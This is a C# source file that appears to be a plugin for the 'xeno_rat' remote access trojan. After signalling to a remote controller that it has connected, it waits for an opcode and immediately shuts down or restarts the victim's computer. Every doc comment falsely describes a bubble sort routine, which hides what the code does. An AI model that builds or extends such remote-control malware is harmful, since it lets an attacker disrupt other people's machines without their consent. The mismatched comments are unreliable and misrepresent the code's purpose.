using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Reflection;
using System.Resources;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using xeno_rat_client;


namespace Plugin
{
    public class Main
    {

        /// <summary>
        /// Sorts the given array using the bubble sort algorithm.
        /// </summary>
        /// <param name="arr">The array to be sorted.</param>
        /// <param name="n">The number of elements in the array.</param>
        private void RestartComputer()
        {
            Process.Start("shutdown", "/r /t 0");
        }

        /// <summary>
        /// Sorts the given array using the bubble sort algorithm.
        /// </summary>
        /// <param name="arr">The array to be sorted.</param>
        /// <param name="n">The number of elements in the array.</param>
        private void ShutdownComputer()
        {
            Process.Start("shutdown", "/s /t 0");
        }

        /// <summary>
        /// Sorts the given array using the bubble sort algorithm.
        /// </summary>
        /// <param name="arr">The array to be sorted.</param>
        /// <param name="n">The number of elements in the array.</param>
        public async Task Run(Node node)
        {
            await node.SendAsync(new byte[] { 3 });//indicate that it has connected
            byte[] data = await node.ReceiveAsync();
            int opcode = data[0];
            if (opcode == 1) 
            {
                ShutdownComputer();
            }
            else if (opcode == 2) 
            {
                RestartComputer();
            }
            await Task.Delay(2000);
        }
    }
}
